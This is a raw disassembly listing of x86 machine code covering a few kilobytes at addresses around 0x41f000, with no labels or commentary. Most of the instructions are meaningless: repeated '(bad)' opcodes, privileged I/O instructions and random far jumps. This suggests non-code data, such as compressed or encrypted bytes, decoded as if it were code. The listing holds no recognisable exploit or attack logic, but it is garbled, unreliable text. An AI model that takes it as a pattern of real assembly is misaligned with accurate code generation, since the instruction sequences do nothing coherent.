  41f010:	shr    DWORD PTR [ebx+0x3c],cl
  41f013:	lahf   
  41f014:	xchg   al,al
  41f016:	ja     0x41f075
  41f018:	fldcw  WORD PTR [ebx-0x7d816bf9]
  41f01e:	(bad)  
  41f01f:	outs   dx,DWORD PTR ds:[esi]
  41f020:	and    al,0xce
  41f022:	(bad)  [ebx]
  41f024:	adc    esi,ecx
  41f026:	mov    al,ds:0x84f16f8a
  41f02b:	imul   ecx,DWORD PTR fs:[edi+edx*2+0x17],0xae8d6661
  41f034:	mov    ecx,0x130f0cfa
  41f039:	iret   
  41f03a:	mov    dh,BYTE PTR [si+0x60]
  41f03e:	sbb    dh,bl
  41f040:	xchg   esp,eax
  41f041:	shl    dl,0x84
  41f044:	xor    dl,BYTE PTR [ebx-0x28]
  41f047:	sar    DWORD PTR [ebx+ebx*4],cl
  41f04a:	ret    
  41f04b:	les    eax,FWORD PTR [ebp-0x2e4ce7b9]
  41f051:	mov    dl,0x7f
  41f053:	jbe    0x41f077
  41f055:	add    BYTE PTR [edx],0xc6
  41f058:	imul   edx,DWORD PTR [ebp-0x33],0x9c953092
  41f05f:	in     al,0x37
  41f061:	mov    al,0x69
  41f063:	inc    eax
  41f064:	mov    edi,0xd6e8fa17
  41f069:	sbb    cl,dl
  41f06b:	cld    
  41f06c:	jge    0x41f05b
  41f06e:	adc    esp,DWORD PTR [ebp-0x5c]
  41f071:	add    al,0xcd
  41f073:	inc    ebp
  41f074:	inc    esp
  41f075:	sar    DWORD PTR [ebx-0x14],cl
  41f078:	cmp    al,0xf2
  41f07a:	icebp  
  41f07b:	sub    al,0x20
  41f07d:	pop    ebp
  41f07e:	pusha  
  41f07f:	aam    0x3
  41f081:	repnz sbb DWORD PTR [esi],ecx
  41f084:	test   eax,0xb9979f6d
  41f089:	fbstp  TBYTE PTR [ecx-0x2508e4e7]
  41f08f:	push   edx
  41f091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f092:	addr16 out dx,al
  41f094:	adc    al,0xe5
  41f096:	mov    edi,0xb8133135
  41f09b:	mov    al,ds:0xffb6174e
  41f0a0:	je     0x41f042
  41f0a2:	popf   
  41f0a3:	adc    al,bh
  41f0a5:	inc    edx
  41f0a6:	pop    ebp
  41f0a7:	out    dx,al
  41f0a8:	inc    edx
  41f0a9:	jle    0x41f087
  41f0ab:	jmp    0x41f0a0
  41f0ad:	jns    0x41f0dd
  41f0af:	das    
  41f0b0:	and    al,0x92
  41f0b2:	ja     0x41f067
  41f0b4:	test   BYTE PTR [edx],0x89
  41f0b7:	pop    ecx
  41f0b8:	js     0x41f07d
  41f0ba:	jmp    0xe3baa36e
  41f0bf:	inc    eax
  41f0c0:	imul   DWORD PTR [ecx]
  41f0c2:	xchg   edi,eax
  41f0c3:	mov    dl,0x3
  41f0c5:	inc    esi
  41f0c6:	adc    bl,BYTE PTR [eax-0x68]
  41f0c9:	or     eax,DWORD PTR [eax]
  41f0cb:	shl    BYTE PTR [ebp+0x12],0xad
  41f0cf:	adc    ah,BYTE PTR [ecx+edi*2]
  41f0d2:	push   eax
  41f0d3:	dec    edx
  41f0d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0d5:	jg     0x41f111
  41f0d7:	jns    0x41f079
  41f0d9:	pop    eax
  41f0da:	fwait
  41f0db:	cmp    al,BYTE PTR [esi]
  41f0dd:	int    0x80
  41f0df:	push   ebx
  41f0e0:	cmp    bh,BYTE PTR ds:0x77efe4d2
  41f0e6:	data16 lods al,BYTE PTR ds:[esi]
  41f0e8:	enter  0xa5dd,0x8d
  41f0ec:	push   ebp
  41f0ed:	aad    0xf9
  41f0ef:	fiadd  WORD PTR [ebp+0x18f2c4b]
  41f0f5:	sub    BYTE PTR [ecx],bh
  41f0f7:	dec    BYTE PTR [esp+eax*1+0x69]
  41f0fb:	ins    DWORD PTR es:[edi],dx
  41f0fc:	mov    bh,0x26
  41f0fe:	cmp    BYTE PTR [ebp-0x2c],ah
  41f101:	add    dh,BYTE PTR [edx+eax*8-0x3c]
  41f105:	cld    
  41f106:	mov    bl,0x10
  41f108:	adc    dl,BYTE PTR [edx]
  41f10a:	sbb    dl,dl
  41f10c:	inc    esi
  41f10d:	cli    
  41f10e:	jno    0x41f163
  41f110:	rol    BYTE PTR [eax],1
	...
  41f172:	add    BYTE PTR [eax],al
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x30360b2f
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0x80000001
  41f18d:	push   ebx
  41f18e:	cmp    DWORD PTR [ecx],ecx
  41f190:	ins    BYTE PTR es:[edi],dx
  41f191:	mov    ?,esi
  41f193:	repnz rol ebx,cl
  41f196:	add    al,0x6e
  41f199:	push   es
  41f19a:	or     eax,0x84216b67
  41f19f:	test   BYTE PTR [ebp+0x2534c3c8],ah
  41f1a5:	inc    ecx
  41f1a6:	jo     0x41f15b
  41f1a8:	stc    
  41f1a9:	jmp    0xea0:0x63e54381
  41f1b0:	inc    esp
  41f1b1:	adc    BYTE PTR [edi+0x22],al
  41f1b4:	cmp    bh,ch
  41f1b6:	shr    DWORD PTR [eax+0x5c],cl
  41f1b9:	repnz mov ds:0xaf660b33,eax
  41f1bf:	xor    ebp,DWORD PTR [eax+0x5e]
  41f1c2:	push   0xe1a92b51
  41f1c7:	jae    0x41f158
  41f1c9:	mov    ss,ecx
  41f1cb:	mov    ebx,0x3b833205
  41f1d0:	jnp    0x41f163
  41f1d2:	dec    ebx
  41f1d3:	lock jns 0x41f1bc
  41f1d6:	inc    ebp
  41f1d7:	xor    dl,BYTE PTR [ecx+0x5cc1aa48]
  41f1dd:	mov    cl,0x1d
  41f1df:	dec    edx
  41f1e0:	sbb    eax,DWORD PTR [esi+eax*1]
  41f1e3:	fcom   QWORD PTR [edi-0x76]
  41f1e6:	dec    edx
  41f1e7:	ss mov dl,dh
  41f1ea:	rol    BYTE PTR [esi+eax*4-0xb0d836c],0x21
  41f1f2:	cs jbe 0x41f1f3
  41f1f5:	jle    0x41f215
  41f1f7:	lock xor DWORD PTR [edi+esi*8],edx
  41f1fb:	and    eax,0x4bd4fe42
  41f200:	pop    edi
  41f201:	aaa    
  41f202:	mov    WORD PTR [ebx+0x5c],gs
  41f205:	or     ch,BYTE PTR [edi+0x504c444f]
  41f20b:	mov    edi,0xcac19874
  41f210:	cmp    ah,BYTE PTR [edx+0x7393f305]
  41f216:	enter  0xf61a,0x2a
  41f21a:	sbb    eax,edx
  41f21c:	iret   
  41f21d:	outs   dx,BYTE PTR ds:[esi]
  41f21e:	adc    DWORD PTR [ebp-0x70daf170],esp
  41f224:	rcl    BYTE PTR [esi+0x3772a131],1
  41f22a:	sbb    DWORD PTR [edx+edx*2+0x44008ba1],0x7f
  41f232:	inc    edi
  41f233:	lods   eax,DWORD PTR ds:[esi]
  41f234:	push   edx
  41f235:	ja     0x41f25d
  41f237:	cmp    al,0x73
  41f239:	inc    DWORD PTR [ebp+0x6]
  41f23c:	retf   0xf436
  41f23f:	rcl    BYTE PTR [ebx-0x73],cl
  41f242:	push   edx
  41f243:	jmp    0x4c89ced4
  41f248:	imul   BYTE PTR [edi]
  41f24a:	std    
  41f24b:	dec    ebp
  41f24c:	jmp    0x358f:0x3c80a598
  41f253:	jge    0x41f2af
  41f255:	shl    edi,1
  41f257:	cmp    DWORD PTR [eax+eax*4],ebx
  41f25a:	pop    es
  41f25b:	sbb    BYTE PTR [ebx-0x19],ch
  41f25e:	inc    esp
  41f25f:	jge    0x41f241
  41f261:	xchg   edi,eax
  41f262:	sbb    DWORD PTR [edx-0x51253ae2],ebx
  41f268:	cmp    BYTE PTR [ecx],bl
  41f26a:	mov    bh,0xe7
  41f26c:	mov    edi,0x4c448ff1
  41f271:	pop    edi
  41f272:	mov    ah,0x46
  41f274:	icebp  
  41f275:	and    eax,0xc935459b
  41f27a:	xchg   ebx,eax
  41f27b:	xchg   esi,eax
  41f27c:	aam    0x1b
  41f27e:	or     al,0x6d
  41f280:	mov    eax,ds:0x2aa15bec
  41f285:	retf   0xb9df
  41f288:	pop    edx
  41f289:	xchg   ebx,eax
  41f28a:	fcomip st,st(1)
  41f28c:	das    
  41f28d:	pop    eax
  41f28e:	(bad)  
  41f28f:	mov    al,0x3f
	...
  41f2f1:	add    BYTE PTR [eax],al
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2f4
  41f301:	js     0x41f36e
  41f303:	xchg   DWORD PTR [esp+ecx*2],esi
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0x53000001
  41f30d:	sbb    eax,DWORD PTR [esi+0x2e]
  41f310:	sti    
  41f311:	inc    ebp
  41f312:	push   edi
  41f313:	cmp    BYTE PTR [esi+edi*2+0x6345e26e],al
  41f31a:	cli    
  41f31b:	mov    dh,0x50
  41f31d:	ror    ah,cl
  41f31f:	test   esp,ebx
  41f321:	ret    0x4797
  41f324:	pop    eax
  41f325:	sub    ch,BYTE PTR [ebp+0x71f2b6ac]
  41f32b:	mov    ch,ch
  41f32d:	stos   BYTE PTR es:[edi],al
  41f32e:	add    cl,dl
  41f330:	inc    eax
  41f331:	push   esi
  41f332:	push   eax
  41f333:	or     eax,0xa72f683e
  41f338:	retf   
  41f339:	jp     0x41f306
  41f33b:	imul   edi,DWORD PTR [edx-0x5c],0x165f8e6d
  41f342:	cmp    eax,0xabe0f09f
  41f347:	fistp  DWORD PTR [eax+0x7daf8071]
  41f34d:	pop    ebx
  41f34e:	sbb    al,0x6d
  41f350:	cmp    al,0x78
  41f352:	(bad)  
  41f353:	fiadd  WORD PTR [edi+0x2f]
  41f356:	fwait
  41f357:	lods   eax,DWORD PTR ds:[esi]
  41f358:	loopne 0x41f2f4
  41f35a:	push   0x3de99ef8
  41f35f:	dec    ecx
  41f360:	add    eax,0xd7ec77a3
  41f365:	ret    
  41f366:	jmp    0xe556:0x3e5976a4
  41f36d:	hlt    
  41f36e:	into   
  41f36f:	jg     0x41f383
  41f371:	push   0xea2607f0
  41f376:	and    eax,0x826f0511
  41f37b:	jmp    0x61c65799
  41f380:	shl    DWORD PTR [edx-0x68],0x2
  41f384:	xchg   esp,eax
  41f385:	aas    
  41f386:	jns    0x41f361
  41f388:	xchg   eax,edi
  41f38a:	dec    esi
  41f38b:	in     al,dx
  41f38c:	fnsetpm(287 only) 
  41f38e:	mov    bl,0xcc
  41f390:	sub    DWORD PTR [esi-0x350c440f],ebx
  41f396:	sub    BYTE PTR ds:0x39b98316,bh
  41f39c:	add    bh,bl
  41f39e:	lds    ecx,FWORD PTR [ebp+ebp*2-0x688a088d]
  41f3a5:	mov    edx,0x67df61bb
  41f3aa:	add    ebp,ecx
  41f3ac:	aad    0xed
  41f3ae:	xor    ebp,ebp
  41f3b0:	sub    al,BYTE PTR [edx-0x2d]
  41f3b3:	xor    al,0xea
  41f3b5:	xchg   esi,ebx
  41f3b7:	les    ecx,FWORD PTR [ebp+0x4]
  41f3ba:	scas   eax,DWORD PTR es:[edi]
  41f3bb:	cs (bad) 
  41f3bd:	pop    ecx
  41f3be:	adc    cl,dl
  41f3c0:	das    
  41f3c1:	sar    BYTE PTR [esi],0xbf
  41f3c4:	icebp  
  41f3c5:	pop    es
  41f3c6:	adc    DWORD PTR [edx],ecx
  41f3c8:	daa    
  41f3c9:	pop    ebp
  41f3ca:	out    0xd0,eax
  41f3cc:	dec    BYTE PTR [ecx]
  41f3ce:	outs   dx,DWORD PTR ds:[esi]
  41f3cf:	sbb    al,0xb7
  41f3d1:	add    ecx,DWORD PTR [ecx-0x17]
  41f3d4:	lahf   
  41f3d5:	adc    DWORD PTR [edx+ebp*8],0xffffffb3
  41f3d9:	clc    
  41f3da:	inc    ebx
  41f3db:	dec    esp
  41f3dc:	dec    ebx
  41f3dd:	addr16 fmul st,st(7)
  41f3e0:	fstp   QWORD PTR [edx-0x65650b68]
  41f3e6:	lahf   
  41f3e7:	imul   edi,DWORD PTR [esi+ecx*2],0x50
  41f3eb:	imul   ebx,ebp,0x78
  41f3ee:	lock or ebp,edi
  41f3f1:	jno    0x41f3f7
  41f3f3:	lock sub eax,0xd8e4119d
  41f3f9:	cmp    eax,0xddd50752
  41f3fe:	imul   esi,DWORD PTR [eax-0x1c],0xd4c1f0a1
  41f405:	lahf   
  41f406:	fdiv   DWORD PTR [ebx-0x401e17eb]
  41f40c:	mov    ch,0x5a
  41f40e:	pop    edi
  41f40f:	js     0x41f39b
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x17
  41f481:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f483:	idiv   BYTE PTR [ecx]
  41f485:	dec    ebp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    eax,0x12000001
  41f48d:	jle    0x41f4e5
  41f48f:	(bad)  
  41f490:	mov    ebp,0x3b9a3b5b
  41f495:	jb     0x41f515
  41f497:	push   esi
  41f498:	xlat   BYTE PTR ds:[ebx]
  41f499:	fucomip st,st(2)
  41f49b:	or     ah,BYTE PTR [ebx+0x31]
  41f49e:	iret   
  41f49f:	sbb    DWORD PTR [eax+0x6e18b0af],ebp
  41f4a5:	cld    
  41f4a6:	mov    ds:0x2fb24e6d,al
  41f4ab:	jbe    0x41f4ab
  41f4ad:	dec    esi
  41f4ae:	push   0xe748d30f
  41f4b3:	test   BYTE PTR [edi-0x7419a4b2],ch
  41f4b9:	sub    al,ch
  41f4bb:	inc    ecx
  41f4bc:	sbb    dh,BYTE PTR [edi+0x95b69c4]
  41f4c2:	push   0xffffff9c
  41f4c4:	push   0xb6fc3f27
  41f4c9:	jmp    0xd9f65ac9
  41f4ce:	mov    esp,0x94c1334b
  41f4d3:	adc    DWORD PTR [ebx],edi
  41f4d5:	and    BYTE PTR ds:0x69ba60a8,al
  41f4db:	cmp    esi,DWORD PTR [ebp-0x34]
  41f4de:	xor    cl,BYTE PTR [ecx+0x892ad3b]
  41f4e4:	lock inc ecx
  41f4e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4e7:	iret   
  41f4e8:	sub    al,0x7e
  41f4ea:	in     al,dx
  41f4eb:	gs fwait
  41f4ed:	sub    BYTE PTR [ebx+0x3937b2b8],dh
  41f4f3:	adc    al,0xbc
  41f4f5:	je     0x41f4ac
  41f4f7:	mov    eax,ds:0x16a8dfab
  41f4fc:	dec    ecx
  41f4fd:	push   ss
  41f4fe:	mov    ebp,0x9ac07a32
  41f503:	add    bl,BYTE PTR [eax+0x65]
  41f506:	leave  
  41f507:	add    BYTE PTR [eax-0x15a756a6],ch
  41f50d:	xchg   esp,eax
  41f50e:	pop    ecx
  41f50f:	add    edx,ebx
  41f511:	rol    DWORD PTR [esi],cl
  41f513:	fdivr  DWORD PTR [edx+esi*8+0x363b9a65]
  41f51a:	mov    eax,0x269e266e
  41f51f:	jb     0x41f585
  41f521:	int    0x3b
  41f523:	retf   
  41f524:	cwde   
  41f525:	sti    
  41f526:	inc    edi
  41f527:	mov    ecx,?
  41f529:	dec    ecx
  41f52a:	xchg   edi,eax
  41f52b:	cmp    bl,dh
  41f52d:	fbld   TBYTE PTR [eax+0x7b]
  41f530:	cmp    bl,bl
  41f532:	sub    DWORD PTR [ebx],edi
  41f534:	ja     0x41f525
  41f536:	or     DWORD PTR [esp+ebp*8],esi
  41f539:	push   esi
  41f53a:	jp     0x41f4f8
  41f53c:	nop
  41f53d:	push   es
  41f53e:	inc    esp
  41f53f:	pop    es
  41f540:	shl    DWORD PTR ds:0xacd4b3c3,cl
  41f546:	jg     0x41f514
  41f548:	jo     0x41f54e
  41f54a:	mov    edx,0x49d39037
  41f54f:	mov    ecx,0x61ef3ef7
  41f554:	add    DWORD PTR [ebx],ebx
  41f556:	aad    0x99
  41f558:	outs   dx,BYTE PTR ds:[esi]
  41f559:	inc    eax
  41f55a:	rcl    BYTE PTR [esi+0x17e36098],1
  41f560:	mov    esi,0xf62db3d2
  41f565:	jb     0x41f56f
  41f567:	outs   dx,BYTE PTR ds:[esi]
  41f568:	mov    esi,0x517f01a0
  41f56d:	cmp    ch,dl
  41f56f:	outs   dx,DWORD PTR ds:[esi]
  41f570:	test   al,0x8c
  41f572:	pop    ecx
  41f573:	add    eax,0x84fbcf66
  41f578:	mov    edx,0xf87241e
  41f57d:	jmp    0x38c89e3e
  41f582:	test   al,0x17
  41f584:	push   eax
  41f585:	push   ecx
  41f586:	pop    es
  41f587:	jl     0x41f5da
  41f589:	mov    ds:0x89764678,al
  41f58e:	lock lods eax,DWORD PTR ds:[esi]
  41f590:	lahf   
	...
  41f5f1:	add    BYTE PTR [eax],al
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x51b5:0x261fd422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x70000001
  41f60d:	int3   
  41f60e:	jmp    0xfec1ad65
  41f613:	ror    DWORD PTR [eax],1
  41f615:	jne    0x41f5a9
  41f617:	jp     0x41f5c4
  41f619:	add    edi,DWORD PTR [esi-0x6a01d9bb]
  41f61f:	jbe    0x41f64a
  41f621:	and    BYTE PTR [esi+0x51],dl
  41f624:	push   ebx
  41f625:	dec    eax
  41f626:	mov    ch,0x6c
  41f628:	fcom   DWORD PTR [ebx]
  41f62a:	dec    edx
  41f62b:	sbb    DWORD PTR [esi-0x6b],edi
  41f62e:	adc    BYTE PTR [eax+0x63a01022],0xa5
  41f635:	cli    
  41f636:	(bad)
  41f639:	push   edx
  41f63a:	sbb    DWORD PTR [edi],edi
  41f63c:	fadd   DWORD PTR [ebp+0x303541f2]
  41f642:	cmc    
  41f643:	outs   dx,BYTE PTR ds:[esi]
  41f644:	imul   ebp,ecx,0xf6dfdfdc
  41f64a:	xchg   edi,eax
  41f64b:	test   ebp,esp
  41f64d:	jp     0x41f6ac
  41f64f:	imul   esp,DWORD PTR [edi-0x7eda1c69],0xc3424daa
  41f659:	jnp    0x41f61f
  41f65b:	mov    ch,0xda
  41f65d:	xchg   BYTE PTR [eax-0x30],bl
  41f660:	dec    ebx
  41f661:	retf   
  41f662:	inc    ecx
  41f663:	and    ebx,DWORD PTR [ebp+0x107dc4c1]
  41f669:	aas    
  41f66a:	xor    DWORD PTR [esp+ebx*2+0x14],esi
  41f66e:	std    
  41f66f:	xor    ah,BYTE PTR [ebx]
  41f671:	inc    ecx
  41f672:	sub    DWORD PTR [ecx+0x54],0x559a2c4d
  41f679:	jmp    0x985e89ad
  41f67e:	sub    eax,0x20d74db9
  41f683:	aaa    
  41f684:	bound  edx,QWORD PTR [edx]
  41f686:	lea    esp,[edi]
  41f688:	ret    0x7246
  41f68b:	cmc    
  41f68c:	cs fimul DWORD PTR cs:[edi-0x431f00a3]
  41f694:	add    eax,0x45484ce7
  41f699:	xlat   BYTE PTR ds:[ebx]
  41f69a:	add    al,cl
  41f69c:	cmc    
  41f69d:	xor    al,dh
  41f69f:	push   ss
  41f6a0:	push   ebp
  41f6a1:	loope  0x41f65e
  41f6a3:	stos   BYTE PTR es:[edi],al
  41f6a4:	mov    esp,0xa0394d79
  41f6a9:	jp     0x41f6b8
  41f6ab:	mov    cl,0x9b
  41f6ad:	dec    edx
  41f6ae:	dec    edx
  41f6af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6b0:	inc    edx
  41f6b1:	fiadd  DWORD PTR [esi+0x5c44d10f]
  41f6b7:	lds    esi,FWORD PTR [esi]
  41f6b9:	dec    esp
  41f6ba:	loope  0x41f6d1
  41f6bc:	inc    ecx
  41f6bd:	mov    eax,ds:0x3296c0ff
  41f6c2:	sub    eax,0x37d5a03d
  41f6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c8:	mov    dh,dl
  41f6ca:	or     DWORD PTR [edx-0x2e],esi
  41f6cd:	sbb    ebx,DWORD PTR ds:0x2a33b629
  41f6d3:	lods   al,BYTE PTR ds:[esi]
  41f6d4:	xor    BYTE PTR [esi+0x3e],0x19
  41f6d8:	push   eax
  41f6d9:	xor    eax,0x40b79fa7
  41f6de:	mov    al,BYTE PTR [ebx-0x6d]
  41f6e1:	ror    BYTE PTR [eax],0xff
  41f6e4:	mov    cl,0xda
  41f6e6:	clc    
  41f6e7:	xor    DWORD PTR [ecx],ecx
  41f6e9:	lock mov dl,0xf6
  41f6ec:	stos   DWORD PTR es:[edi],eax
  41f6ed:	cld    
  41f6ee:	shl    dl,1
  41f6f0:	cmp    DWORD PTR [edi+0x3dd0e78d],0x6fd4fabd
  41f6fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6fb:	push   ebx
  41f6fc:	xor    eax,0xa003b852
  41f701:	popa   
  41f702:	adc    eax,0xe5b39bfb
  41f707:	imul   edx,ecx,0x29
  41f70a:	sbb    ebp,esp
  41f70c:	xor    al,0xc4
  41f70e:	push   esp
  41f70f:	mov    ecx,0x9
	...
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xef15:0x206c62d2
  41f783:	adc    al,0x43
  41f785:	dec    edi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0x3c000001
  41f78d:	shl    BYTE PTR [ebp-0x5847627c],cl
  41f793:	lods   al,BYTE PTR ds:[esi]
  41f794:	mov    ebx,0xd6b0b14d
  41f799:	outs   dx,BYTE PTR ds:[esi]
  41f79a:	mov    es:0xca194b9,al
  41f7a0:	out    0x7e,al
  41f7a2:	sbb    edx,DWORD PTR [ebx]
  41f7a4:	xchg   esp,eax
  41f7a5:	jecxz  0x41f73a
  41f7a7:	xchg   ebx,eax
  41f7a8:	lods   eax,DWORD PTR ds:[esi]
  41f7a9:	jae    0x41f82a
  41f7ab:	lea    esi,[ecx+0x5c479c7a]
  41f7b1:	mov    eax,0x225d9e35
  41f7b6:	out    0x48,eax
  41f7b8:	mov    ?,WORD PTR [ebp-0x65]
  41f7bb:	sub    bl,al
  41f7bd:	sbb    BYTE PTR ds:0x4f0c15c1,bl
  41f7c3:	pop    esi
  41f7c4:	pop    ebx
  41f7c5:	cmp    bl,bh
  41f7c7:	mov    DWORD PTR [ebx+edx*8+0x41],esp
  41f7cb:	loope  0x41f7cb
  41f7cd:	imul   BYTE PTR [ecx-0x3e]
  41f7d0:	ins    DWORD PTR es:[edi],dx
  41f7d1:	ins    DWORD PTR es:[edi],dx
  41f7d2:	inc    ebx
  41f7d3:	rcr    DWORD PTR [edi+0xe43687c],1
  41f7d9:	in     eax,0x4a
  41f7db:	sub    dh,ch
  41f7dd:	cli    
  41f7de:	test   eax,0xae4e89a1
  41f7e3:	in     al,0xb1
  41f7e5:	and    bh,BYTE PTR [ecx+0x66097e77]
  41f7eb:	dec    bx
  41f7ed:	jne    0x41f7a4
  41f7ef:	call   0x2bc8c385
  41f7f4:	nop
  41f7f5:	out    dx,al
  41f7f6:	mov    BYTE PTR [edx+edi*1],bh
  41f7f9:	or     eax,0xd40958f8
  41f7fe:	lahf   
  41f7ff:	mov    cl,0xec
  41f801:	std    
  41f802:	(bad)  
  41f803:	mov    es,eax
  41f805:	xchg   DWORD PTR [ecx-0x42984b41],ebp
  41f80b:	push   es
  41f80c:	jb     0x41f804
  41f80e:	jbe    0x41f7fc
  41f810:	sub    BYTE PTR [ecx-0x499b766e],cl
  41f816:	jecxz  0x41f7cd
  41f818:	mov    ch,0x92
  41f81a:	dec    ecx
  41f81b:	imul   esp,DWORD PTR [edi-0x59da152b],0xffffffd4
  41f822:	mov    DWORD PTR [ebx+0x16d41555],eax
  41f828:	vpunpckhwd xmm1,xmm2,XMMWORD PTR [eax]
  41f82c:	in     eax,dx
  41f82d:	mov    eax,ds:0x643b17c0
  41f832:	pop    edi
  41f833:	and    ax,0x9b41
  41f837:	fwait
  41f838:	pop    ds
  41f839:	jmp    0x2102aa79
  41f83e:	in     al,dx
  41f83f:	fidivr WORD PTR [edi+0x4e]
  41f842:	add    eax,0x4a3b6a43
  41f847:	mov    dh,BYTE PTR [edi]
  41f849:	add    ebp,esp
  41f84b:	loopne 0x41f8c7
  41f84d:	test   eax,0x6be183b9
  41f852:	mov    ah,0xac
  41f854:	mov    edi,0x7f44c846
  41f859:	push   edx
  41f85a:	js     0x41f7f8
  41f85c:	leave  
  41f85d:	sbb    BYTE PTR [eax+ecx*8],0xd4
  41f861:	call   0x3463:0xa3f8767e
  41f868:	sbb    al,0x15
  41f86a:	adc    edi,DWORD PTR [ecx+0x6a]
  41f86d:	ins    DWORD PTR es:[edi],dx
  41f86e:	frstor [edi+edi*8-0x2c1982ac]
  41f875:	add    ch,al
  41f877:	sub    DWORD PTR [eax+0x29aa5d55],ebp
  41f87d:	mov    bh,0x15
  41f87f:	pop    ds
  41f880:	mov    ebx,0xffafe7be
  41f885:	sbb    al,0x6e
  41f887:	and    ecx,DWORD PTR ds:0xad3f50d6
  41f88d:	enter  0xc82e,0x1b
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	jmp    0x48c7cf32
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0x5e000001
  41f90d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f90e:	cmp    ah,BYTE PTR [ebp-0x69]
  41f911:	jg     0x41f8a7
  41f913:	adc    DWORD PTR [ebx-0x592c7af7],edx
  41f919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f91a:	imul   eax,DWORD PTR [ecx+ebp*1],0xffffffc1
  41f91e:	inc    DWORD PTR [ebx-0x50a4bc93]
  41f924:	mov    ds,WORD PTR [ebx+ebp*2]
  41f927:	outs   dx,DWORD PTR ds:[esi]
  41f928:	xchg   ebp,eax
  41f929:	xchg   ebp,eax
  41f92a:	outs   dx,BYTE PTR ds:[esi]
  41f92b:	imul   edi,DWORD PTR [edx],0x360a61b7
  41f931:	push   edi
  41f932:	cmp    al,0xeb
  41f934:	inc    esi
  41f935:	adc    ah,BYTE PTR [edx+0x7e]
  41f938:	xchg   DWORD PTR [eax+0xb],ebx
  41f93b:	push   esp
  41f93c:	or     al,0xc5
  41f93e:	sahf   
  41f93f:	jecxz  0x41f921
  41f941:	push   0x3d
  41f943:	mov    bl,0xe8
  41f945:	rcl    BYTE PTR [esi-0x5a4ce089],cl
  41f94b:	rcl    BYTE PTR [ebp+ebp*4-0xb743cfe],cl
  41f952:	or     cl,BYTE PTR [esi-0x72b25cff]
  41f958:	pop    ds
  41f959:	sti    
  41f95a:	retf   
  41f95b:	popa   
  41f95c:	xchg   ecx,eax
  41f95d:	xor    ecx,DWORD PTR [ecx-0x62428aa8]
  41f963:	or     edx,ecx
  41f965:	rcl    BYTE PTR [esi-0x3],0x2d
  41f969:	add    ebp,DWORD PTR [ebp+0x2d]
  41f96c:	fst    st(0)
  41f96e:	inc    ebx
  41f96f:	add    BYTE PTR [ebx+0x5d],bl
  41f972:	(bad)  
  41f973:	cs clc 
  41f975:	mul    esp
  41f977:	int3   
  41f978:	cwde   
  41f979:	fs sbb cl,al
  41f97c:	push   ds
  41f97d:	call   0xdff7:0x7b4c7cd8
  41f984:	(bad)  [edx-0x5a]
  41f987:	pop    eax
  41f988:	push   ebx
  41f989:	jmp    0xa247e3d0
  41f98e:	mov    esi,0x95b64674
  41f993:	cs fcmovne st,st(1)
  41f996:	add    ah,dh
  41f998:	js     0x41f95d
  41f99a:	enter  0x2ebc,0xbd
  41f99e:	inc    ecx
  41f99f:	call   0x895d:0x2b0a1534
  41f9a6:	aad    0xf1
  41f9a8:	dec    ecx
  41f9a9:	push   esi
  41f9aa:	mov    ah,0xe2
  41f9ac:	(bad)  
  41f9ad:	(bad)  
  41f9ae:	cmp    cl,bh
  41f9b0:	xor    al,0x75
  41f9b2:	push   ds
  41f9b3:	xchg   edi,eax
  41f9b4:	add    BYTE PTR [ecx+0xdaaaab6],al
  41f9ba:	and    al,0x3b
  41f9bc:	lahf   
  41f9bd:	sub    dh,BYTE PTR [edx+edi*2]
  41f9c0:	xor    eax,0x206ff986
  41f9c5:	lods   al,BYTE PTR ds:[esi]
  41f9c6:	mov    BYTE PTR [ecx],bh
  41f9c8:	aam    0xbb
  41f9ca:	sbb    esp,ecx
  41f9cc:	and    esp,ebp
  41f9ce:	jp     0x41f9f9
  41f9d0:	std    
  41f9d1:	cld    
  41f9d2:	add    ch,BYTE PTR [esi+0x2c0b7490]
  41f9d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9d9:	push   ebp
  41f9da:	or     al,0x6f
  41f9dc:	ret    
  41f9dd:	cdq    
  41f9de:	jb     0x41f9db
  41f9e0:	jnp    0x41f973
  41f9e2:	aas    
  41f9e3:	pop    ss
  41f9e4:	and    al,0xbd
  41f9e6:	pushf  
  41f9e7:	les    eax,FWORD PTR [eax-0x457faf54]
  41f9ed:	pusha  
  41f9ee:	addr16 cmp edi,eax
